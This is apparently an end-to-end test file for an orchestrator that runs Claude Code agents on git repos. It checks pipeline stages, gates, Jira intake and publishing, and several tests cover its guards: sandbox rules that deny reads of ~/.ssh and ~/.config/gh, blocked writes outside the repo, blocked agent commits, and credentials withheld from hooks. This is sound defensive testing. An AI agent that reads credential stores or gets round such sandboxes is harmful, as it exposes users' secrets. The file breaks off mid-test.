// End to end: the real engine, runner, hook server and hook script against a fake Claude CLI and real git repos.
import test from 'node:test';
import * as assert from 'node:assert/strict';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { execFileSync } from 'child_process';

import { setChildEnv, getChildEnv } from '../src/core/git';
import { buildArgs } from '../src/core/runner';
import { writeUserMcpConfig } from '../src/core/mcp';
import { AtlassianClient } from '../src/core/intake';
import * as view from '../src/core/view';
import { git, workspace, harness, only, runTask, previewOf, text, waitFor } from './helpers/e2e';
import type { PermissionRequest } from '../src/core/engine';
import type { Agent, Readiness } from '../src/core/types';
import type { RunnerOptions } from '../src/core/runner';
import type { AuditResult, ReadinessResult } from '../src/core/report';

test('engine: full pipeline across two repos with a red gate, a fix round, commit and "keep local"', async () => {
  const ws = workspace(
    ['api', 'web'],
    `agents:
  planner: { effort: max }
  security: { extends: reviewer, enabled: false }
repos:
  api:
    gates:
      - { name: has-feature, cmd: test -f feature.txt }
  web:
    gates:
      - { name: flaky, cmd: 'test -f "$FAKE_STATE/gate-ok" || { touch "$FAKE_STATE/gate-ok"; echo "lint: 1 error"; exit 1; }' }
`
  );
  const h = await harness(ws, { FAKE_REPOS: 'api,web', FAKE_REVIEW: 'fail-once' });
  try {
    const { taskId, created } = await h.engine.start({ text: 'Add the feature everywhere', effort: { reviewer: 'low' } });
    assert.ok(created);
    assert.match(taskId, /^T-\d{8}-\d{4}$/);

    let s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint!.id, 'approve-plan');
    const ctx = await h.engine.checkpointContext(s, s.checkpoint!);
    assert.match(ctx.text, /## Summary/);

    await h.engine.answer(taskId, 'approve-plan', 'approve');
    s = await waitFor(async () => {
      const st = await h.engine.svc.state(taskId);
      return !h.engine.isRunning(taskId) && st.checkpoint ? st : null;
    }, 60000);
    assert.equal(s.checkpoint!.id, 'confirm-push', JSON.stringify(h.engine.lastError(taskId)));

    // Branches, commits and what was kept out of them.
    for (const repo of ['api', 'web']) {
      const dir = path.join(ws, repo);
      assert.equal(git(dir, 'rev-parse', '--abbrev-ref', 'HEAD'), 'feat/add-feature');
      assert.equal(git(dir, 'log', '-1', '--format=%s'), 'feat: add the feature');
      assert.deepEqual(git(dir, 'show', '--name-only', '--format=', 'HEAD').split('\n').sort(), ['feature.test.txt', 'feature.txt']);
    }
    assert.ok(!fs.existsSync(path.join(ws, 'outside.txt')), 'a write outside the repo was denied');

    const events = await h.engine.svc.events(taskId);
    const gates = only(events, 'gates_ran').filter((e) => e.repo === 'web').map((e) => e.status);
    assert.ok(gates.includes('fail') && gates.includes('pass'), `web gates went red then green: ${gates}`);
    assert.equal(only(events, 'stage_started').filter((e) => e.agent === 'reviewer').length, 2, 'one fix round');
    const fixRound = only(events, 'stage_started').filter((e) => e.agent === 'developer').map((e) => e.repo);
    assert.deepEqual(fixRound, ['api', 'web', 'web'], 'the fix round only re-ran the repo with findings');
    const testers = only(events, 'stage_started').filter((e) => e.agent === 'tester');
    assert.deepEqual(testers.map((e) => e.repo), [undefined, undefined], 'one tester per round, across all repos');
    const order = only(events, 'stage_started').map((e) => `${e.agent}${e.repo ? `@${e.repo}` : ''}`);
    assert.deepEqual(order.slice(0, 5), ['planner', 'developer@api', 'developer@web', 'tester', 'reviewer']);
    const testerPrompt = text((await h.engine.svc.readTranscript(taskId, (await view.detail(h.engine, taskId)).steps.find((st) => st.agent === 'tester')!.key!)).find((i) => i.type === 'prompt')!.text);
    assert.match(testerPrompt, /Repositories of this task[^\n]*\n- api at .+\n- web at /);

    // The guard fed denials back into the transcript.
    const blocked = h.outputs.flatMap((o) => (o.item.type === 'blocked' ? [o.item.reason] : []));
    assert.ok(blocked.some((r) => /agents do not run git commit/.test(r)));
    assert.ok(blocked.some((r) => /outside/.test(r)));
    assert.ok(h.outputs.some((o) => o.item.type === 'text_delta'));

    // Agent CLI calls carried the agent's settings.
    const planner = h.calls().find((c) => c.args.includes('--model') && c.args[c.args.indexOf('--model') + 1] === 'opus');
    assert.ok(planner!.args.includes('--tools'));
    assert.equal(planner!.args[planner!.args.indexOf('--effort') + 1], 'max', 'the agent runs at its effort');
    const efforts = h.calls().filter((c) => c.args.includes('--append-system-prompt')).map((c) => (c.args.includes('--effort') ? c.args[c.args.indexOf('--effort') + 1] : null));
    assert.ok(efforts.includes('low'), 'the task override reached the reviewer');
    assert.ok(efforts.every((e) => e === null || e === 'max' || e === 'low' || e === 'medium'), `agents without a task or config effort use their built-in one: ${efforts}`);
    const sonnet = h.calls().filter((c) => c.args.includes('--model') && c.args[c.args.indexOf('--model') + 1] === 'sonnet');
    assert.ok(sonnet.length > 0, 'developer and tester run on sonnet by default');
    assert.ok(sonnet.every((c) => c.args[c.args.indexOf('--effort') + 1] === 'medium'), 'developer and tester run at medium effort by default');
    assert.ok(sonnet.every((c) => c.args.includes('--strict-mcp-config')), 'agents that only work on the repo get no MCP servers');
    assert.ok(!planner!.args.includes('--strict-mcp-config'), 'the planner keeps them');
    assert.equal((await view.detail(h.engine, taskId)).steps.find((st) => st.agent === 'reviewer')!.effort, 'low');
    assert.deepEqual(h.engine.limits!.fiveHour, { pct: 31, resetsAt: 1900000000, status: 'allowed' });
    assert.equal(h.engine.limits!.sevenDay!.pct, 26);
    assert.ok(h.outputs.some((o) => o.item.type === 'usage' && Number(o.item.ctxPct) > 0 && Number(o.item.tokens) > 0));
    assert.equal(planner!.args[planner!.args.indexOf('--tools') + 1], 'Read,Grep,Glob,Bash');

    const d = await view.detail(h.engine, taskId);
    assert.equal(d.status.key, 'waiting');
    assert.ok(d.cost > 0);
    assert.ok(d.steps.some((st) => st.kind === 'agent' && st.agent === 'reviewer' && st.verdict && st.verdict.status === 'changes_requested'));
    const plannerStep = d.steps.find((st) => st.agent === 'planner');
    assert.equal(plannerStep!.effort, 'max');
    assert.equal(plannerStep!.model, 'claude-opus-5-5', 'the model the session really ran, not the alias');
    const devStep = d.steps.find((st) => st.agent === 'developer');
    assert.equal(devStep!.effort, 'medium', 'an agent left at the default shows the effort it really ran with');
    assert.ok(plannerStep!.ctxPct! > 0 && plannerStep!.tokens! > 0);
    const transcript = await h.engine.svc.readTranscript(taskId, d.steps.find((st) => st.agent === 'developer')!.key!);
    assert.ok(transcript.some((i) => i.type === 'prompt'));
    const web = await h.engine.svc.readTranscript(taskId, d.steps.filter((st) => st.agent === 'developer' && st.repo === 'web')[0]!.key!);
    assert.ok(web.some((i) => i.type === 'gates' && i.status === 'fail'));
    assert.ok(web.some((i) => i.type === 'user' && i.from === 'orchestrator' && /Gates failed/.test(text(i.text))));

    // Checks and the commit hooks ran in the sandbox: the repo writable, its git metadata only for the commit.
    const api = path.join(ws, 'api');
    const gate = h.sandboxed.find((p) => p.allowWrite[0] === api && p.denyWrite.includes(path.join(api, '.git')))!;
    assert.ok(gate, 'a gate of api ran sandboxed');
    assert.ok(gate.denyWrite.includes(path.join(ws, '.claudestrator')), "and cannot change Claudestrator's config");
    assert.ok(gate.denyRead.includes('~/.ssh') && gate.denyRead.includes('~/.config/gh'));
    assert.ok(gate.network.includes('registry.npmjs.org') && !gate.network.includes('api.github.com'));
    assert.equal(gate.localPorts, false, 'no local port unless policy.localPorts');
    const commit = h.sandboxed.find((p) => p.allowWrite.includes(path.join(api, '.git')))!;
    assert.ok(commit, 'the commit ran sandboxed');
    assert.ok(!commit.denyWrite.includes(path.join(api, '.git')), 'git writes its objects and refs');

    await h.engine.answer(taskId, 'confirm-push', 'local');
    s = await waitFor(async () => (h.engine.isRunning(taskId) ? null : await h.engine.svc.state(taskId)));
    assert.equal(s.status, 'done');
    assert.equal(s.outcome, 'local');
    assert.equal((await view.summary(h.engine, { taskId, state: s })).status.label, 'Kept local');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: dirty checkouts block branch mode, stop interrupts a hanging agent, resume re-runs the step', async () => {
  const ws = workspace(['api'], 'repos:\n  api: {}\n');
  fs.writeFileSync(path.join(ws, 'api', 'wip.txt'), 'uncommitted');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Do a thing --auto' });
    h.engine.launch(taskId);
    await waitFor(async () => h.engine.lastError(taskId));
    assert.equal(h.engine.lastError(taskId)!.code, 'repos_not_ready');
    assert.equal((h.engine.lastError(taskId)!.blocked as { problem: string }[])[0]!.problem, 'uncommitted changes');
    assert.equal((await view.summary(h.engine, { taskId, state: await h.engine.svc.state(taskId) })).status.key, 'failed');
    assert.equal((await view.summary(h.engine, { taskId, state: await h.engine.svc.state(taskId) })).status.resumable, true, 'a failed run is resumed from where it is');

    fs.rmSync(path.join(ws, 'api', 'wip.txt'));
    setChildEnv({ ...getChildEnv(), FAKE_HANG: 'developer' });
    h.engine.launch(taskId);
    await waitFor(async () => h.engine.sessions.has(taskId) && h.engine.live(taskId) && h.engine.live(taskId)!.phase === 'agent' && h.engine.live(taskId)!.step!.agent === 'developer');
    await h.engine.stop(taskId);
    await waitFor(async () => !h.engine.isRunning(taskId));
    let s = await h.engine.svc.state(taskId);
    assert.equal(s.status, 'stopped');
    assert.equal(s.running[0]!.agent, 'developer', 'the interrupted step stays the running one');
    assert.equal((await view.summary(h.engine, { taskId, state: s })).mini.find((m) => m.agent === 'developer')!.status, 'paused');

    setChildEnv({ ...getChildEnv(), FAKE_HANG: '' });
    await h.engine.resume(taskId);
    s = await waitFor(async () => (!h.engine.isRunning(taskId) && (await h.engine.svc.state(taskId)).checkpoint ? await h.engine.svc.state(taskId) : null), 30000);
    assert.equal(s.checkpoint!.id, 'confirm-push');
    assert.equal(only(await h.engine.svc.events(taskId), 'stage_started').filter((e) => e.agent === 'developer').length, 1, 'resume continued the same step');
    const devKey = (await view.detail(h.engine, taskId)).steps.find((st) => st.agent === 'developer')!.key!;
    const prompts = (await h.engine.svc.readTranscript(taskId, devKey)).filter((i) => i.type === 'prompt').map((i) => text(i.text));
    assert.equal(prompts.length, 2, 'the rerun shows in the transcript');
    assert.doesNotMatch(prompts[0]!, /was interrupted/);
    assert.match(prompts[1]!, /An earlier run of this step was interrupted[^\n]*git status and git diff first/, 'and tells the agent its repo may hold part of the work');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: ask-me mode routes tool calls to the user', async () => {
  const ws = workspace(['api'], 'repos:\n  api: {}\npipeline: [planner, developer]\n');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  h.engine.askPermissions = () => true;
  const asked: PermissionRequest[] = [];
  h.engine.on('permission', (req: PermissionRequest) => {
    asked.push(req);
    h.engine.permissionReply(req.requestId, req.tool !== 'Write' || !/feature\.txt$/.test(text((req.input as { file_path?: unknown }).file_path)), 'not this file');
  });
  try {
    const { taskId } = await h.engine.start({ text: 'Small thing', auto: true });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint!.id, 'confirm-push');
    assert.ok(asked.some((r) => r.tool === 'Write'));
    assert.ok(!fs.existsSync(path.join(ws, 'api', 'feature.txt')), 'the denied write did not happen');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a repo outside the workspace folder (absolute path) is branched, changed, checked and committed', async () => {
  const outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-outside-')));
  const dir = path.join(outside, 'billing');
  fs.mkdirSync(dir);
  git(dir, 'init', '-q', '-b', 'main');
  fs.writeFileSync(path.join(dir, 'README.md'), '# billing\n');
  git(dir, 'add', '.');
  git(dir, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '-m', 'init');
  const ws = workspace([], `pipeline: [planner, developer]\nrepos:\n  billing:\n    path: ${dir}\n    gates:\n      - { name: has-feature, cmd: test -f feature.txt }\n`);
  const h = await harness(ws, { FAKE_REPOS: 'billing' });
  try {
    const { taskId } = await h.engine.start({ text: 'Outside repo', auto: true });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push', JSON.stringify(h.engine.lastError(taskId)));
    assert.equal(git(dir, 'rev-parse', '--abbrev-ref', 'HEAD'), 'feat/add-feature');
    assert.equal(git(dir, 'log', '-1', '--format=%s'), 'feat: add the feature');
    assert.equal(only(await h.engine.svc.events(taskId), 'gates_ran')[0]!.status, 'pass');
    assert.ok(!fs.existsSync(path.join(ws, 'billing')), 'nothing was created inside the workspace for it');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a Jira task is read through an Atlassian MCP server when there is no API token, read-only', async () => {
  const ws = workspace(['api'], 'repos:\n  api: {}\npipeline: [planner]\n');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  h.engine.mcpIntake = async () => ({ server: 'Atlassian', site: 'acme.atlassian.net' });
  try {
    const { taskId } = await h.engine.start({ text: 'PROJ-805' });
    assert.equal(taskId, 'PROJ-805');
    await h.engine.run(taskId);
    const s = await h.engine.svc.state(taskId);
    assert.equal(s.phase, 'done', JSON.stringify(h.engine.lastError(taskId)));
    assert.equal(s.spec!.title, 'PROJ-805 Cap the max bet');
    assert.deepEqual(s.spec!.acceptanceCriteria, ['bets above the cap are rejected'], 'criteria fall back to the description');
    assert.equal(s.spec!.links[0]!.url, 'https://acme.atlassian.net/browse/PROJ-805');
    assert.match(await h.engine.svc.readArtifact(taskId, 'ticket.md'), /per operator, not global/);
    const intake = await h.engine.svc.readTranscript(taskId, '0000-intake');
    assert.ok(intake.some((i) => i.type === 'tool_use' && i.name === 'mcp__Atlassian__getJiraIssue'));
    assert.ok(intake.some((i) => i.type === 'blocked' && i.tool === 'mcp__Atlassian__addCommentToJiraIssue'), 'writes to Jira are blocked');
    const step = (await view.detail(h.engine, taskId)).steps[0];
    assert.equal(step!.kind, 'intake');
    assert.equal(step!.key, '0000-intake');
    assert.equal(step!.model, 'claude-haiku-5-5');
    const call = h.calls().find((c) => c.args.includes('--effort') && c.args[c.args.indexOf('--effort') + 1] === 'low');
    assert.ok(call, 'the intake runs on a small, quick setting');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a signed-out Claude Code is reported as such, and agents get the account MCP servers', async () => {
  const ws = workspace(['api'], 'repos:\n  api: {}\npipeline: [planner]\n');
  const h = await harness(ws, { FAKE_REPOS: 'api', FAKE_AUTH_FAIL: '1' });
  h.engine.mcpIntake = async () => ({ server: 'Atlassian' });
  try {
    const { taskId } = await h.engine.start({ text: 'PROJ-9' });
    h.engine.launch(taskId);
    await waitFor(async () => h.engine.lastError(taskId));
    assert.equal(h.engine.lastError(taskId)!.code, 'claude_login');
    assert.match(h.engine.lastError(taskId)!.message!, /signed out/);
  } finally {
    h.hooks.dispose();
  }
  const base = { flags: () => new Set(['--mcp-config']) } as Partial<RunnerOptions>;
  const withMcp = { agent: {} as Agent, mcpConfig: '/m.json', settings: {} };
  assert.ok(buildArgs(withMcp, { ...base, settingSources: () => ['project', 'local'] } as RunnerOptions).includes('/m.json'), 'without the user source, MCP servers come in explicitly');
  assert.ok(!buildArgs(withMcp, { ...base, settingSources: () => ['user', 'project'] } as RunnerOptions).includes('--mcp-config'), 'with it, Claude Code loads them itself');
  const strict = { ...base, flags: () => new Set(['--mcp-config', '--strict-mcp-config']), settingSources: () => ['project', 'local'] } as RunnerOptions;
  const none = buildArgs({ ...withMcp, agent: { mcp: false } as Agent }, strict);
  assert.ok(none.includes('--strict-mcp-config') && !none.includes('--mcp-config'), 'an agent with mcp: false sees no MCP servers, not even the account ones');
  assert.ok(!buildArgs(withMcp, strict).includes('--strict-mcp-config'), 'by default nothing changes');
  assert.ok(!buildArgs({ agent: { mcp: false } as Agent, settings: {} }, { ...strict, flags: () => new Set(['--mcp-config']) } as RunnerOptions).includes('--strict-mcp-config'), 'an old CLI without the flag still runs');
  const cfg = fs.mkdtempSync(path.join(os.tmpdir(), 'cs-acc-'));
  const account = path.join(cfg, '.claude.json');
  fs.writeFileSync(account, JSON.stringify({ mcpServers: { Grafana: { type: 'http', url: 'http://x', headers: { Authorization: 'Bearer t' } } } }));
  const out = path.join(cfg, 'out', 'mcp.json');
  const file = (await writeUserMcpConfig(out, cfg))!;
  assert.deepEqual(Object.keys(JSON.parse(fs.readFileSync(file, 'utf8')).mcpServers), ['Grafana']);
  assert.equal(fs.statSync(file).mode & 0o777, 0o600, 'it carries tokens, so only you can read it');
  const before = fs.statSync(file).mtimeMs;
  await new Promise((r) => setTimeout(r, 20));
  assert.equal(await writeUserMcpConfig(out, cfg), file);
  assert.equal(fs.statSync(file).mtimeMs, before, 'an unchanged account file is not read and written again');
  fs.writeFileSync(account, JSON.stringify({ mcpServers: { Grafana: {}, Sentry: { type: 'http', url: 'http://s' } } }));
  await writeUserMcpConfig(out, cfg);
  assert.deepEqual(Object.keys(JSON.parse(fs.readFileSync(file, 'utf8')).mcpServers), ['Grafana', 'Sentry'], 'a changed one is');
});

test('engine: "PROJ-805 перевір готовність…" runs a read-only readiness check, writes the report and posts it to Jira via MCP', async () => {
  const ws = workspace(['api'], 'repos:\n  api: { role: Betting API }\n');
  // GitHub, as `gh pr list --search PROJ-805` sees it: agents never reach it, Claudestrator asks for them.
  const bin = fs.mkdtempSync(path.join(os.tmpdir(), 'cs-gh-'));
  fs.writeFileSync(path.join(bin, 'gh'), `#!/bin/sh\ncase "$*" in *"pr list --search PROJ-805"*) echo '[{"number":42,"title":"PROJ-805 cap bets","url":"https://github.com/acme/api/pull/42","state":"MERGED","isDraft":false,"headRefName":"feat/PROJ-805-cap","baseRefName":"main","mergedAt":"2026-10-01T10:00:00Z"}]';; *) exit 1;; esac\n`, { mode: 0o755 });
  const h = await harness(ws, { FAKE_REPOS: 'api', PATH: `${bin}${path.delimiter}${process.env.PATH}` });
  h.engine.mcpIntake = async () => ({ server: 'Atlassian', site: 'acme.atlassian.net' });
  try {
    const request = 'PROJ-805 перевір готовність виконання таски і закриття всіх критеріїв приймання';
    const p = await previewOf(h.engine, { text: request });
    assert.equal(p.scenario, 'readiness');
    assert.ok(p.scenarioDetected, 'picked from the words');
    assert.equal(p.source.kind, 'jira');
    assert.equal(p.taskId, 'PROJ-805-check', 'next to the delivery task PROJ-805, not on top of it');
    assert.deepEqual(p.pipeline.stages.map((st) => st.agent), ['verifier']);

    const { taskId } = await h.engine.start({ text: request });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.status, 'done', JSON.stringify(h.engine.lastError(taskId)));
    assert.equal(s.scenario, 'readiness');
    assert.equal((s.reports[0]!.value as Readiness).verdict, 'not_ready', 'a criterion is not met and a gap is high');
    assert.match(await h.engine.svc.readArtifact(taskId, 'ticket.md'), /## What the user asked\n\nперевір готовність/);

    const prompt = fs.readFileSync(path.join(h.state, 'prompt-verifier.txt'), 'utf8');
    assert.match(prompt, new RegExp(`- api at ${path.join(ws, 'api').replace(/[.*+?^${}()|[\]\\]/g, '\\$&')} \\(base branch main\\): Betting API`));
    assert.match(prompt, /Jira issue: PROJ-805\. Search branches and commits for this key; the pull and merge requests that mention it are listed in .*github\/prs\.md/);
    assert.match(await h.engine.svc.readArtifact(taskId, 'github/prs.md'), /## api\n\n- #42 \[merged, merged 2026-10-01\] PROJ-805 cap bets: feat\/PROJ-805-cap → main, https:\/\/github\.com\/acme\/api\/pull\/42/);
    assert.ok(!fs.existsSync(path.join(ws, 'api', 'audit-notes.txt')), 'the verifier cannot write');
    assert.ok(h.outputs.some((o) => o.item.type === 'blocked' && /does not change files/.test(text(o.item.reason))));
    assert.equal(git(path.join(ws, 'api'), 'rev-parse', '--abbrev-ref', 'HEAD'), 'main', 'no branch was made');

    const report = await h.engine.svc.readArtifact(taskId, 'report.md');
    assert.match(report, /Not ready/);
    assert.match(report, /\| ❌ \| the cap is per operator \| not met \|/);
    const d = await view.detail(h.engine, taskId);
    assert.equal(d.status.label, 'Not ready');
    assert.equal(d.result!.kind, 'readiness');
    assert.equal((d.result as ReadinessResult).met, 1);
    assert.equal(d.steps.find((st) => st.agent === 'verifier')!.readiness!.verdict, 'not_ready');
    assert.ok(!d.steps.some((st) => st.kind === 'finish'), 'no commit or PR steps');

    const r = await h.engine.postReport(taskId);
    assert.ok(r.ok, JSON.stringify(r));
    const posted = fs.readFileSync(path.join(h.state, 'comment-PROJ-805.txt'), 'utf8');
    assert.match(posted, /^Readiness check: ❌ Not ready \(1\/2 met\)/);
    assert.match(posted, /\[high\] no test for the cap/);
    const comments = (await view.detail(h.engine, taskId)).comments;
    assert.deepEqual(comments.map((c) => [c.what, c.ok, c.via]), [['report', true, 'mcp:Atlassian']]);
    const commentLog = await h.engine.svc.readTranscript(taskId, 'comment-1');
    assert.ok(commentLog.some((i) => i.type === 'blocked' && i.tool === 'mcp__Atlassian__editJiraIssue'), 'nothing but the comment is written');
    const refused = commentLog.flatMap((i) => (i.type === 'blocked' && i.tool === 'mcp__Atlassian__addCommentToJiraIssue' ? [text(i.reason)] : []));
    assert.equal(refused.length, 3, 'not on another issue, not with more than the text, and only once');
    assert.match(refused[0]!, /goes on PROJ-805 and no other issue/);
    assert.match(refused[1]!, /exactly as given/);
    assert.ok(commentLog.some((i) => i.type === 'blocked' && i.tool === 'mcp__Atlassian__searchJiraIssuesUsingJql'), 'it reads no issue');
    assert.doesNotMatch(posted, /hunter2/);

    // Checking again after it finished is a new run.
    assert.equal((await previewOf(h.engine, { text: request })).taskId, 'PROJ-805-check-2');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: an audit finds bugs and bottlenecks, rates them and reports; a Jira comment without a connection is recorded as failed', async () => {
  const ws = workspace(['api'], 'repos:\n  api: {}\n');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const request = 'Аудит проекту на вузькі місця, перформанс і помилки';
    assert.equal((await previewOf(h.engine, { text: request })).scenario, 'audit');
    assert.equal((await previewOf(h.engine, { text: 'Add caching to the report endpoint' })).scenario, 'deliver');
    assert.equal((await previewOf(h.engine, { text: 'Add caching', scenario: 'audit' })).scenario, 'audit', 'a choice in the composer wins');
    const { taskId } = await h.engine.start({ text: request });
    assert.match(taskId, /^AUDIT-\d{8}-\d{4}$/);
    const s = await runTask(h.engine, taskId);
    assert.equal(s.status, 'done', JSON.stringify(h.engine.lastError(taskId)));
    const d = await view.detail(h.engine, taskId);
    const result = d.result as AuditResult;
    assert.deepEqual(result.findings.map((f) => f.severity), ['critical', 'medium'], 'worst first');
    assert.deepEqual(result.counts, { critical: 1, high: 0, medium: 1, low: 0 });
    assert.equal(d.status.label, '2 findings · 1 serious');
    assert.equal(d.status.tone, 'error');
    const report = await h.engine.svc.readArtifact(taskId, 'report.md');
    assert.match(report, /\*\*Critical: 1\*\* · \*\*High: 0\*\* · \*\*Medium: 1\*\* · \*\*Low: 0\*\*/);
    assert.match(report, /### 1\. Payout can be negative/);
    assert.ok(d.files.some((f) => f.path === 'audit/auditor.md'));

    await assert.rejects(h.engine.postReport(taskId), /not come from a Jira issue/);
    const r = await h.engine.comment({ ...s, source: { kind: 'jira', key: 'PROJ-1' } }, 'hello', 'report');
    assert.equal(r.ok, false);
    assert.match(r.error!, /Jira is not connected/);
    assert.equal((await view.detail(h.engine, taskId)).comments[0]!.ok, false, 'a failure is visible on the task, not only in a log');
  } finally {
    h.hooks.dispose();
  }
});

/**
 * Repos of `ws` with a bare origin each, a pre-push hook in the first, and a gh that opens PRs (`gh pr edit` answers
 * with `edit`): what publishing needs.
 */
function remoteSetup(ws: string, hook: string, { repos = ['api'], edit = 'exit 0' }: { repos?: string[]; edit?: string } = {}) {
  for (const name of repos) {
    const bare = path.join(ws, `${name}-remote.git`);
    git(ws, 'init', '-q', '--bare', bare);
    git(path.join(ws, name), 'remote', 'add', 'origin', bare);
    git(path.join(ws, name), 'push', '-q', 'origin', 'main');
  }
  const api = path.join(ws, repos[0]!);
  fs.writeFileSync(path.join(api, '.git', 'hooks', 'pre-push'), hook, { mode: 0o755 });
  const bin = fs.mkdtempSync(path.join(os.tmpdir(), 'cs-gh-'));
  fs.writeFileSync(path.join(bin, 'gh'), `#!/bin/sh\ncase "$1 $2" in "pr view") exit 1;; "pr create") echo "https://github.com/acme/$(basename "$PWD")/pull/7";; "pr edit") ${edit};; *) exit 0;; esac\n`, { mode: 0o755 });
  return { remote: path.join(ws, `${repos[0]}-remote.git`), api, path: `${bin}${path.delimiter}${process.env.PATH}` };
}

test('engine: checks and git hooks get no credential of yours, and the pre-push hook runs once, before git pushes', async () => {
  const ws = workspace(['api'], `pipeline: [planner, developer]\nrepos:\n  api:\n    gates:\n      - { name: env, cmd: 'test -z "$ACME_DEPLOY_TOKEN" && test "$DATABASE_URL" = postgres://u:p@db/x' }\npolicy: { checkEnv: [DATABASE_URL] }\n`);
  const { remote, path: PATH } = remoteSetup(ws, '#!/bin/sh\necho "$1 $2 $(cat) token=${ACME_DEPLOY_TOKEN:-none}" >> "$FAKE_STATE/pre-push.log"\n');
  const h = await harness(ws, { FAKE_REPOS: 'api', ACME_DEPLOY_TOKEN: 's3cret', DATABASE_URL: 'postgres://u:p@db/x', PATH });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    let s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push', JSON.stringify(h.engine.lastError(taskId)));
    const gates = only(await h.engine.svc.events(taskId), 'gates_ran');
    assert.ok(gates.length > 0 && gates.every((e) => e.status === 'pass'), `the gate saw no token, and the variable policy.checkEnv keeps: ${JSON.stringify(gates)}`);

    await h.engine.answer(taskId, 'confirm-push', 'push');
    s = await waitFor(async () => (h.engine.isRunning(taskId) ? null : await h.engine.svc.state(taskId)));
    assert.equal(s.outcome, 'published', JSON.stringify(h.engine.lastError(taskId)));
    assert.deepEqual(s.prs, { api: 'https://github.com/acme/api/pull/7' });
    const branch = 'feat/add-feature';
    const sha = git(path.join(ws, 'api'), 'rev-parse', branch);
    const runs = fs.readFileSync(path.join(h.state, 'pre-push.log'), 'utf8').trim().split('\n');
    assert.deepEqual(runs, [`origin ${remote} refs/heads/${branch} ${sha} refs/heads/${branch} ${'0'.repeat(40)} token=none`], 'once, as git would run it, without your credentials');
    assert.equal(git(remote, 'rev-parse', branch), sha, 'then git pushed');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a repo on Bitbucket without a saved token stops the publish before anything is pushed', async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const { path: PATH } = remoteSetup(ws, '#!/bin/sh\necho ran >> "$FAKE_STATE/pre-push.log"\n');
  git(path.join(ws, 'api'), 'remote', 'set-url', 'origin', 'git@bitbucket.org:acme/api.git');
  const h = await harness(ws, { FAKE_REPOS: 'api', PATH });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    await runTask(h.engine, taskId);
    await h.engine.answer(taskId, 'confirm-push', 'push');
    await waitFor(async () => !h.engine.isRunning(taskId));
    const err = h.engine.lastError(taskId);
    assert.equal(err && err.code, 'pr_failed');
    assert.match(err!.message, /^api: acme\/api is on Bitbucket.*API token.*Integrations → Bitbucket/);
    assert.ok(!fs.existsSync(path.join(h.state, 'pre-push.log')), 'not even the pre-push hook ran');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a failing pre-push hook stops the push and says why', async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const { remote, path: PATH } = remoteSetup(ws, '#!/bin/sh\necho "lint: 3 problems"\nexit 1\n');
  const h = await harness(ws, { FAKE_REPOS: 'api', PATH });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    await runTask(h.engine, taskId);
    await h.engine.answer(taskId, 'confirm-push', 'push');
    await waitFor(async () => !h.engine.isRunning(taskId));
    const err = h.engine.lastError(taskId);
    assert.equal(err && err.code, 'push_failed');
    assert.match(err!.message, /pre-push hook failed:\nlint: 3 problems/);
    assert.throws(() => git(remote, 'rev-parse', '--verify', 'feat/add-feature'), 'nothing was pushed');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: an agent that cannot start is a failed step to retry, and one stopped while it starts does no work', async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  const real = h.engine.runner;
  try {
    // A CLI the guard cannot rely on: start() throws before any process runs.
    h.engine.runner = { start: async (req) => (/developer/.test(req.name ?? '') ? Promise.reject(new Error('Claude Code 2.1.290 is older than 2.1.302')) : real.start(req)) };
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    let s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'agent-failure');
    assert.match(s.checkpoint!.reason!, /did not start: Claude Code 2\.1\.290 is older/);
    assert.equal(h.hooks.sessions.size, 0, 'its guard token is gone');
    assert.equal(h.engine.lastError(taskId), null, 'a step that failed, not a run');

    // Stop while the session starts: Stop finds no session yet, the step sees the stop as soon as it has one.
    let starting!: () => void;
    const started = new Promise<void>((r) => (starting = r));
    h.engine.runner = { start: async (req) => { starting(); await new Promise((r) => setTimeout(r, 300)); return real.start(req); } };
    await h.engine.answer(taskId, 'agent-failure', 'retry');
    await started;
    await h.engine.stop(taskId);
    await waitFor(async () => !h.engine.isRunning(taskId));
    s = await h.engine.svc.state(taskId);
    assert.equal(s.status, 'stopped');
    assert.equal(h.engine.lastError(taskId), null, 'a stop is not reported as a failure');
    assert.ok(!only(await h.engine.svc.events(taskId), 'stage_completed').some((e) => e.agent === 'developer'), 'the agent did not get to work');
    assert.ok(!fs.existsSync(path.join(ws, 'api', 'feature.txt')), 'and changed nothing');
  } finally {
    h.engine.runner = real;
    h.hooks.dispose();
  }
});

test('engine: when a PR description cannot list the other PRs, the PRs stay opened and the log says so', async () => {
  const ws = workspace(['api', 'web'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n  web: {}\n');
